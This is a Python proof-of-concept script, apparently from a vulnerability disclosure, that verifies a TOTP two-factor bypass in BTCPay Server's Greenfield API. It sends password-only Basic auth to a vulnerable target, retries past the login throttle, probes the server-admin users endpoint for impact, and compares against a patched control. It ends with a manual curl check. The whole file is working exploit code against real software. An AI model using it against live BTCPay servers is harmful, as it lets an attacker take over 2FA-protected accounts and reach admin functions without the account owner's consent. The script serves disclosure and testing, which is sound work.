#!/usr/bin/env python3
# Author: al4n4n (Dadb0d)
"""
verify.py - Verification dashboard for the BTCPay Server Greenfield API
TOTP 2FA bypass (PR #7491, fixed in v2.4.2).

Runs the bypass test for N rounds against the vulnerable target and, unless
--no-negative, runs the identical request against a patched target as a negative
control. Prints a dashboard and a verdict. Exit 0 iff the bypass is confirmed.

Usage:
    python3 verify.py --url http://127.0.0.1:8080 --fixed-url http://127.0.0.1:8081 \
        --user admin@lab.local --password 'Lab-Passw0rd!2026' --rounds 5

Stdlib only.
"""
import argparse
import base64
import sys
import time
import urllib.error
import urllib.request

ME = "/api/v1/users/me"
ADMIN = "/api/v1/users"
PATCHED_2FA = "multi-factor is enabled"          # PR #7491 fix (the 2FA gate)
PATCHED_OPTIN = "is not enabled for this user"   # PR #7492 hardening (opt-in gate)
THROTTLED = "rate limited"


def basic(user, password):
    return "Basic " + base64.b64encode(f"{user}:{password}".encode()).decode()


def get(url, path, auth, timeout=15):
    req = urllib.request.Request(url.rstrip("/") + path)
    req.add_header("Authorization", auth)
    req.add_header("Accept", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.getcode(), r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        return None, str(e)


def get_unthrottled(url, path, auth, delay):
    """GET, retrying once past the per-IP login throttle."""
    code, body = get(url, path, auth)
    if code == 401 and THROTTLED in body.lower():
        time.sleep(delay * 2)
        code, body = get(url, path, auth)
    return code, body


def line(c="-", n=70):
    return c * n


def main():
    ap = argparse.ArgumentParser(description="Verify BTCPay Greenfield 2FA bypass")
    ap.add_argument("--url", default="http://127.0.0.1:8080", help="vulnerable target base URL")
    ap.add_argument("--fixed-url", default="http://127.0.0.1:8081", help="patched target (negative control)")
    ap.add_argument("--user", required=True)
    ap.add_argument("--password", required=True)
    ap.add_argument("--rounds", type=int, default=5)
    ap.add_argument("--delay", type=float, default=4.0,
                    help="seconds between requests (avoids the per-IP login throttle)")
    ap.add_argument("--no-negative", action="store_true", help="skip the patched-version control")
    args = ap.parse_args()

    auth = basic(args.user, args.password)

    print(line("="))
    print(" BTCPay Server Greenfield API - TOTP 2FA bypass  (PR #7491 / v2.4.2)")
    print(" CWE-287 Authentication Bypass  |  attack vector: Network (HTTP Basic auth)")
    print(line("="))
    print(" ENVIRONMENT")
    print(f"   vulnerable target : {args.url}")
    print(f"   patched target    : {'(skipped)' if args.no_negative else args.fixed_url}")
    print(f"   account           : {args.user}  (TOTP 2FA enabled, no FIDO2)")
    print(f"   credential sent   : email + password   (NO TOTP code, NO FIDO2, NO API key)")
    print(f"   rounds            : {args.rounds}")
    print(line())
    print(" TEST EXECUTION  (expect HTTP 200 = bypass on the vulnerable target)")

    hits = 0
    log = []
    for i in range(1, args.rounds + 1):
        if i > 1:
            time.sleep(args.delay)
        code, body = get_unthrottled(args.url, ME, auth, args.delay)
        ok = code == 200
        hits += 1 if ok else 0
        tag = "BYPASS" if ok else "blocked"
        print(f"   round {i:>2}/{args.rounds}  ->  HTTP {code}  [{tag}]")
        log.append((i, code, body[:90]))

    rate = hits / args.rounds if args.rounds else 0

    # one-shot impact evidence (admin-scope endpoint) when bypassed
    admin_reachable = None
    if hits:
        time.sleep(args.delay)
        c, b = get_unthrottled(args.url, ADMIN, auth, args.delay)
        admin_reachable = c == 200

    print(line())
    print(" EVIDENCE LOG (vulnerable target)")
    for i, code, snippet in log:
        print(f"   [{i}] HTTP {code}: {snippet}")
    if admin_reachable is not None:
        print(f"   [*] server-admin endpoint {ADMIN}: {'HTTP 200 REACHABLE' if admin_reachable else 'blocked'}")

    neg_ok = None
    neg_code = neg_body = None
    if not args.no_negative:
        print(line())
        print(" NEGATIVE CONTROL (patched target - identical request)")
        time.sleep(args.delay)
        neg_code, neg_body = get_unthrottled(args.fixed_url, ME, auth, args.delay)
        low = neg_body.lower()
        is_2fa_gate = PATCHED_2FA in low
        neg_ok = neg_code == 401 and (is_2fa_gate or PATCHED_OPTIN in low)
        which = "PR #7491 2FA gate" if is_2fa_gate else (
            "PR #7492 opt-in gate" if neg_ok else "unexpected")
        print(f"   {args.fixed_url}{ME}  ->  HTTP {neg_code}")
        print(f"   body: {neg_body[:110]}")
        print(f"   patched rejection: {'CONFIRMED' if neg_ok else 'NOT confirmed'}  ({which})")

    print(line("="))
    confirmed = hits > 0
    print(" VERDICT")
    if confirmed:
        print(f"   [+] VULNERABLE  -  2FA bypass succeeded {hits}/{args.rounds} rounds ({rate*100:.0f}%)")
        print("       A TOTP-protected account was authenticated over the Greenfield API")
        print("       with email+password only. No second factor was ever supplied.")
        if admin_reachable:
            print("       Impact: server-admin endpoints reachable (unrestricted permission).")
    else:
        print(f"   [-] NOT VULNERABLE  -  0/{args.rounds} rounds bypassed")
    if neg_ok is not None:
        print(f"   [{'+' if neg_ok else '-'}] Negative control: patched target "
              f"{'rejects' if neg_ok else 'did NOT reject as expected'} the same request.")
    print(line("="))
    print(" MANUAL CHECK:")
    print(f"   curl -s -u '{args.user}:<password>' {args.url}{ME}")
    print("   # vulnerable -> HTTP 200 user JSON ; patched -> HTTP 401 'multi-factor is enabled'")

    return 0 if confirmed else 1


if __name__ == "__main__":
    sys.exit(main())
